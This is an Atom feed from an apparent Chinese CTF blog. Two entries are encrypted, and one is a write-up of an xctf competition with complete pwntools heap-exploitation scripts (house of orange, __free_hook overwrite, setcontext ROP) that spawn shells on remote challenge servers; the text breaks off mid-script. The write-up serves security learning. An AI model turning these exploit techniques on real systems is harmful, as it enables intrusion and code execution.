<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Whali3n51&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://whali3n51.github.io/"/>
  <updated>2020-03-29T13:19:02.313Z</updated>
  <id>http://whali3n51.github.io/</id>
  
  <author>
    <name>Whali3n51</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CTF中linux_kernel_pwn本地环境快速部署</title>
    <link href="http://whali3n51.github.io/2020/03/29/CTF%E4%B8%ADlinux_kernel_pwn%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2/"/>
    <id>http://whali3n51.github.io/2020/03/29/CTF%E4%B8%ADlinux_kernel_pwn%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2/</id>
    <published>2020-03-29T03:21:38.000Z</published>
    <updated>2020-03-29T13:19:02.313Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章。</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="9b247e0c5416fc00ebb08aaa589e14e5a463c44164c4202618c3057e7c226747"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      这是一篇加密文章，内容可能是个人情感宣泄或者收费技术。如果你确实想看，请与我联系。
    
    </summary>
    
    
    
      <category term="linux_kernel" scheme="http://Whali3n51.github.io/tags/linux-kernel/"/>
    
  </entry>
  
  <entry>
    <title>glibc2.29和glibc2.30下的新的利用方式--tcache_stashing_unlink_attack_plus</title>
    <link href="http://whali3n51.github.io/2020/03/11/glibc2-29%E5%92%8Cglibc2-30%E4%B8%8B%E7%9A%84%E6%96%B0%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-tcache-stashing-unlink-attack-plus/"/>
    <id>http://whali3n51.github.io/2020/03/11/glibc2-29%E5%92%8Cglibc2-30%E4%B8%8B%E7%9A%84%E6%96%B0%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-tcache-stashing-unlink-attack-plus/</id>
    <published>2020-03-11T06:11:56.000Z</published>
    <updated>2020-03-28T08:10:58.083Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章。</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="e2aaf3d0c29990983eed21abd6b035890aa96c69561c0d9e876d9043df930c68"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      这是一篇加密文章，内容可能是个人情感宣泄或者收费技术。如果你确实想看，请与我联系。
    
    </summary>
    
    
      <category term="pwn学习" scheme="http://Whali3n51.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="tcache_stashing_unlink_attack_plus" scheme="http://Whali3n51.github.io/tags/tcache-stashing-unlink-attack-plus/"/>
    
  </entry>
  
  <entry>
    <title>xctf_高校战役公益赛</title>
    <link href="http://whali3n51.github.io/2020/03/11/xctf-%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9%E5%85%AC%E7%9B%8A%E8%B5%9B/"/>
    <id>http://whali3n51.github.io/2020/03/11/xctf-%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9%E5%85%AC%E7%9B%8A%E8%B5%9B/</id>
    <published>2020-03-11T03:17:35.000Z</published>
    <updated>2020-03-11T03:49:37.894Z</updated>
    
    <content type="html"><![CDATA[<h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>这次比赛总的来说发挥还算不错，虽然没有抢到一血，但是至少做出题目了。对kernel题目来说不太熟练，甚至是有点忘了怎么去做了，有时间了一定要多多熟练kernel的利用，不过这次的每道kernel都有非预期，有点无脑。最后还有一个towchunk的利用，放到后面一篇文章专门讲解。那是一个新的利用技术。最后吐槽一下，这次赛题太多了，肝死我，不过好在肝到了一个养生壶，美滋滋。</p><p><img src="./gift.png" alt=""></p><h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><p>这道题真的卡了我好久，我就没有看出这里的逻辑漏洞，真是想当然的认为在错误了之后就把堆块给free了。</p><p>真是吃到了开发功底不扎实的亏啊。</p><p><img src="https://uploader.shimo.im/f/a0tMHYdvnvM9jaud.png!thumbnail" alt="img">      <code>from</code></p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'easyheap'</span></span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.debug_remote_libc =<span class="literal">False</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line">p=rs()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ctx.remote = (<span class="string">'121.36.209.145'</span>,<span class="number">9997</span>)</span><br><span class="line">p=rs(<span class="string">'remote'</span>)</span><br><span class="line"><span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">libc_base = ctx.bases.libc</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">ctx.symbols = &#123;<span class="string">'sym1'</span>:<span class="number">0x0000000000400B1E</span>&#125;</span><br><span class="line">ctx.breakpoints = [<span class="number">0x0000000000400B1E</span>]</span><br><span class="line">ctx.debug()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">sla(<span class="string">"Your choice:\n"</span>,<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"How long is this message?\n"</span>,size)</span><br><span class="line">sa(<span class="string">"What is the content of the message?\n"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">sla(<span class="string">"Your choice:"</span>,<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">"What is the index of the item to be modified?\n"</span>,index)</span><br><span class="line">sa(<span class="string">"What is the content of the message?\n"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"Your choice:"</span>,<span class="number">2</span>)</span><br><span class="line">sla(<span class="string">"What is the index of the item to be deleted?\n"</span>,index)</span><br><span class="line">choice()</span><br><span class="line">create(<span class="number">0x18</span>,p64(<span class="number">0x602018</span>)+p64(<span class="number">0x200</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">sla(<span class="string">"Your choice:\n"</span>,<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"How long is this message?\n"</span>,str(<span class="number">0x500</span>))</span><br><span class="line">sla(<span class="string">"Your choice:\n"</span>,<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"How long is this message?\n"</span>,str(<span class="number">0x500</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x6020d8</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x6020e8</span>)+p64(<span class="number">0x6020f8</span>)+p64(<span class="number">0x602018</span>)+p64(<span class="number">0x200</span>)+<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x602018</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x0400670</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x602080</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">stdout=uu64(r(<span class="number">6</span>))</span><br><span class="line">libc_base=stdout-(<span class="number">0x7ffff7dd2620</span><span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">leak(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">edit(<span class="number">3</span>,p64(system))</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p><img src="https://uploader.shimo.im/f/fqR8VEcMVucugbCR.png!thumbnail" alt="img">      </p><h2 id="woodenbox"><a href="#woodenbox" class="headerlink" title="woodenbox"></a>woodenbox</h2><p>这个题目就比较简单，就是简单的堆溢出，我为了图方便，不想那么麻烦的攻击__free_hook，直接用来house of orange来getshell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">from PwnContext import *</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-h&apos;]</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">s       = lambda data               :ctx.send(str(data))        #in case that data is an int</span><br><span class="line">sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = lambda data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = lambda numb=4096          :ctx.recv(numb)</span><br><span class="line">ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = lambda                    :ctx.interactive()</span><br><span class="line">rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = lambda gs=&apos;&apos;, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"># misc functions</span><br><span class="line">uu32    = lambda data   :u32(data.ljust(4, &apos;\x00&apos;))</span><br><span class="line">uu64    = lambda data   :u64(data.ljust(8, &apos;\x00&apos;))</span><br><span class="line">leak    = lambda name,addr :log.success(&apos;&#123;&#125; = &#123;:#x&#125;&apos;.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.binary = &apos;woodenbox2&apos;</span><br><span class="line">libc =ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.debug_remote_libc = False</span><br><span class="line">local=0</span><br><span class="line">def choice():</span><br><span class="line">if(local):</span><br><span class="line">p=rs()</span><br><span class="line">else:</span><br><span class="line">ctx.remote = (&apos;121.36.215.224&apos;,9998)</span><br><span class="line">p=rs(&apos;remote&apos;)</span><br><span class="line">return p</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">libc_base = ctx.bases.libc</span><br><span class="line">print hex(libc_base)</span><br><span class="line">ctx.symbols = &#123;&apos;sym1&apos;:0xEDA , &apos;sym2&apos;:0x10AF&#125;</span><br><span class="line">ctx.breakpoints = [0xEDA,0x10AF]</span><br><span class="line">ctx.debug()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def create(size,content):</span><br><span class="line">sla(&quot;Your choice:&quot;,1)</span><br><span class="line">sla(&quot;Please enter the length of item name:&quot;,size)</span><br><span class="line">sa(&quot;Please enter the name of item:&quot;,content)</span><br><span class="line">def edit(index,size,content):</span><br><span class="line">sla(&quot;Your choice:&quot;,2)</span><br><span class="line">sla(&quot;Please enter the index of item:&quot;,index)</span><br><span class="line">sla(&quot;Please enter the length of item name:&quot;,size)</span><br><span class="line">sa(&quot;Please enter the new name of the item:&quot;,content)</span><br><span class="line">def free(index):</span><br><span class="line">sla(&quot;Your choice:&quot;,3)</span><br><span class="line">sla(&quot;Please enter the index of item:&quot;,index)</span><br><span class="line">choice()</span><br><span class="line">create(0xf8,&quot;a&quot;*0x20)</span><br><span class="line">create(0x68,&quot;a&quot;*0x20)</span><br><span class="line">create(0xf8,&quot;a&quot;*0x20)</span><br><span class="line">create(0x18,&quot;a&quot;*0x10)</span><br><span class="line">free(0)</span><br><span class="line">edit(0,0x70,&quot;f&quot;*0x60+p64(0x170)+p64(0x100))</span><br><span class="line">free(0)</span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">create(0xf8,&quot;a&quot;*0x20)</span><br><span class="line">create(0x58,&quot;\xdd\x25&quot;)</span><br><span class="line">create(0xf8,&quot;a&quot;*0x20)</span><br><span class="line">edit(1,0x100,0xf0*&apos;w&apos;+p64(0)+p64(0x70))</span><br><span class="line">create(0x68,&quot;a&quot;*0x20)</span><br><span class="line">create(0x68,&quot;\x00&quot;*0x33+p64(0xfbad1800)+p64(0)*3+&apos;\x88&apos;)</span><br><span class="line">libc_base=uu64(r(6))-(0x7ffff7dd18e0-0x7ffff7a0d000)</span><br><span class="line">leak(&quot;libc_base&quot;,libc_base)</span><br><span class="line">_IO_list_all=libc_base+libc.symbols[&apos;_IO_list_all&apos;]</span><br><span class="line">fake_file=p64(0)+p64(0x61)</span><br><span class="line">fake_file+=p64(0)+p64(_IO_list_all-0x10)</span><br><span class="line">fake_file+=p64(1)+p64(2)</span><br><span class="line">fake_file+=p64(0)+p64(libc_base+0x18cd57)</span><br><span class="line">fake_file=fake_file.ljust(0xd8,&quot;\x00&quot;)</span><br><span class="line">fake_file+=p64(libc_base+0x3c37a0-8)</span><br><span class="line">fake_file+=p64(0)</span><br><span class="line">fake_file+=p64(libc_base+libc.symbols[&apos;system&apos;])</span><br><span class="line">free(3)</span><br><span class="line">edit(1,0x50+len(fake_file),0x50*&apos;a&apos;+fake_file)</span><br><span class="line">sla(&quot;Your choice:&quot;,1)</span><br><span class="line">sla(&quot;Please enter the length of item name:&quot;,str(0x100))</span><br><span class="line">#debug()</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>​        <img src="https://uploader.shimo.im/f/u69g0OXaNO0Pyus2.png!thumbnail" alt="img">      </p><h2 id="lgd"><a href="#lgd" class="headerlink" title="lgd"></a>lgd</h2><p>堆溢出，首先用fast bin attack攻击bss段修改指针，然后修改__free_hook为setcontext,最后劫持栈和rip。最后使用ORW的ROP，最后拿到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'lgd'</span></span><br><span class="line"><span class="comment">#ctx.remote_libc = './libc.so'</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line">p=rs()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ctx.remote = (<span class="string">'121.36.209.145'</span>,<span class="number">9998</span>)</span><br><span class="line">p=rs(<span class="string">'remote'</span>)</span><br><span class="line"><span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">libc_base = ctx.bases.libc</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">ctx.symbols = &#123;<span class="string">'sym1'</span>:<span class="number">0x0401A97</span>&#125;</span><br><span class="line">ctx.breakpoints = [<span class="number">0x0401A97</span>]</span><br><span class="line">ctx.debug()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"__?\n"</span>,size)</span><br><span class="line">sa(<span class="string">"or_no?\n"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">"ex ?\n"</span>,index)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,<span class="number">4</span>)</span><br><span class="line">sla(<span class="string">"ex ?\n"</span>,index)</span><br><span class="line">sa(<span class="string">"tent ?\n"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,<span class="number">2</span>)</span><br><span class="line">sla(<span class="string">"ex ?\n"</span>,index)</span><br><span class="line">choice()</span><br><span class="line">sla(<span class="string">" name? \n"</span>,<span class="string">"whali3n51"</span>)</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">"a"</span>*<span class="number">0x200</span>)</span><br><span class="line">create(<span class="number">0x58</span>,<span class="string">"a"</span>*<span class="number">0x200</span>)</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">"a"</span>*<span class="number">0x200</span>)</span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">"a"</span>*<span class="number">0x200</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">"f"</span>*<span class="number">0x50</span>+p64(<span class="number">0x160</span>)+p64(<span class="number">0x100</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">"a"</span>*<span class="number">0x200</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base=uu64(r(<span class="number">6</span>))-(<span class="number">0x7fb8d44feb78</span><span class="number">-0x7fb8d413a000</span>)</span><br><span class="line">leak(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">create(<span class="number">0x58</span>,<span class="string">"a"</span>*<span class="number">0x200</span>)</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">"a"</span>*<span class="number">0x1f0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x60</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x603250</span>))</span><br><span class="line">create(<span class="number">0x58</span>,<span class="string">"a"</span>*<span class="number">0x100</span>)</span><br><span class="line">create(<span class="number">0x58</span>,<span class="number">0x1f0</span>*<span class="string">'a'</span>)</span><br><span class="line">edit(<span class="number">5</span>,p32(<span class="number">0x200</span>)*<span class="number">8</span>*<span class="number">4</span>+p64(libc_base+libc.symbols[<span class="string">"__free_hook"</span>]))</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+libc.symbols[<span class="string">"setcontext"</span>]+<span class="number">0x35</span>))</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rax = <span class="number">0</span></span><br><span class="line">frame.rsi = (libc_base + libc.symbols[<span class="string">'__free_hook'</span>])</span><br><span class="line">frame.rcx = (libc_base + libc.symbols[<span class="string">'__free_hook'</span>])</span><br><span class="line">frame.rdx = <span class="number">0x2000</span></span><br><span class="line">frame.rsp = (libc_base + libc.symbols[<span class="string">'__free_hook'</span>])</span><br><span class="line">frame.rip = libc_base + <span class="number">0x00000000000bc375</span> <span class="comment">#: syscall; ret; </span></span><br><span class="line">payload = str(frame)</span><br><span class="line">edit(<span 